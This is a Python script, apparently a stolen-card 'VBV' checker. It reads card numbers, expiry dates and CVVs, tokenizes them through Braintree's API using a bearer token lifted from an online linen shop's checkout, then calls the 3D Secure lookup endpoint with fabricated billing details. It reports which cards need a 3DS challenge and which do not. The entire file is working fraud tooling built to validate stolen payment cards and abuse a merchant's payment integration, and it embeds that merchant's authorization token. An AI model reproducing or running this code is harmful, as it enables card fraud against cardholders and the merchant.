import requests,re
import time

def vbv(ccx):
    ccx = ccx.strip()
    n = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3]
    
    if "20" in yy:
        yy = yy.split("20")[1]
    
    r = requests.session()
    
    
    headers = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'tr-TR,tr;q=0.9',
    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3NDMzODIwNjYsImp0aSI6IjAyMmFhY2Y2LWRhYjUtNGYxNi1iMjU4LWM3OTI2ZGE4MWVkNiIsInN1YiI6IjQ1dHg3Zmd5cjg5NnB3d3YiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjQ1dHg3Zmd5cjg5NnB3d3YiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnt9fQ.VPMTVIdmK-QRBzZYSdcto7CMILatqOXlXB3m6mJzWMPtaHvpU81ZLf0H6562JtliAEYIjsE-ZyvHapuAiqBgdA',
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
}
    
    json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': '0347ae64-bbb2-4ac2-be5a-1ce3ea245c0a',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': n,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvc,
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}

    response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
    try:
        tok = response.json()['data']['tokenizeCreditCard']['token']
    except:
        return 'Error Card'
    
    headers = {
    'authority': 'api.braintreegateway.com',
    'accept': '*/*',
    'accept-language': 'tr-TR,tr;q=0.9',
    'content-type': 'application/json',
    'origin': 'https://www.visionlinens.com',
    'referer': 'https://www.visionlinens.com/',
    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
}
    
    json_data = {
    'amount': '12.70',
    'browserColorDepth': 24,
    'browserJavaEnabled': False,
    'browserJavascriptEnabled': True,
    'browserLanguage': 'tr-TR',
    'browserScreenHeight': 800,
    'browserScreenWidth': 360,
    'browserTimeZone': -180,
    'deviceChannel': 'Browser',
    'additionalInfo': {
        'shippingGivenName': 'alex',
        'shippingSurname': 'Aancar',
        'shippingPhone': '(202) 827-8399',
        'ipAddress': '172.71.99.180',
        'billingLine1': ' 22 Exning Road',
        'billingLine2': 'New state 1000',
        'billingCity': 'hardwick',
        'billingPostalCode': 'NR15 2WP',
        'billingCountryCode': 'GB',
        'billingPhoneNumber': '(202) 827-8399',
        'billingGivenName': 'alex',
        'billingSurname': 'Aancar',
        'shippingLine1': ' 22 Exning Road',
        'shippingLine2': 'New state 1000',
        'shippingCity': 'hardwick',
        'shippingPostalCode': 'NR15 2WP',
        'shippingCountryCode': 'GB',
    },
    'challengeRequested': True,
    'bin': '531105',
    'dfReferenceId': '0_33bbefdb-bc99-4034-9336-00398ed96b6c',
    'clientMetadata': {
        'requestedThreeDSecureVersion': '2',
        'sdkVersion': 'web/3.97.2',
        'cardinalDeviceDataCollectionTimeElapsed': 17,
        'issuerDeviceDataCollectionTimeElapsed': 2,
        'issuerDeviceDataCollectionResult': True,
    },
    'authorizationFingerprint': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3NDMzODIwNjYsImp0aSI6IjAyMmFhY2Y2LWRhYjUtNGYxNi1iMjU4LWM3OTI2ZGE4MWVkNiIsInN1YiI6IjQ1dHg3Zmd5cjg5NnB3d3YiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjQ1dHg3Zmd5cjg5NnB3d3YiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnt9fQ.VPMTVIdmK-QRBzZYSdcto7CMILatqOXlXB3m6mJzWMPtaHvpU81ZLf0H6562JtliAEYIjsE-ZyvHapuAiqBgdA',
    'braintreeLibraryVersion': 'braintree/web/3.97.2',
    '_meta': {
        'merchantAppId': 'www.visionlinens.com',
        'platform': 'web',
        'sdkVersion': '3.97.2',
        'source': 'client',
        'integration': 'custom',
        'integrationType': 'custom',
        'sessionId': '0347ae64-bbb2-4ac2-be5a-1ce3ea245c0a',
    },
}

    
    response = requests.post(
	    f'https://api.braintreegateway.com/merchants/45tx7fgyr896pwwv/client_api/v1/payment_methods/{tok}/three_d_secure/lookup',
	    headers=headers,
	    json=json_data,
	)

    time.sleep(1)
    try:
        vbv = response.json()["paymentMethod"]["threeDSecureInfo"]["status"]
    except KeyError:
        return 'Unknown Error ⚠️'
        
    if 'authenticate_attempt_successful' in vbv:
    	return '3DS Challenge Required✅'
    if 'challenge_required' in vbv:
        return '3DS Challenge Required ❌'
    elif 'lookup_card_error' in vbv:
        return 'lookup_card_error ⚠️'
    elif 'lookup_error' in vbv:
        return 'Unknown Error ⚠️'
    return vbv
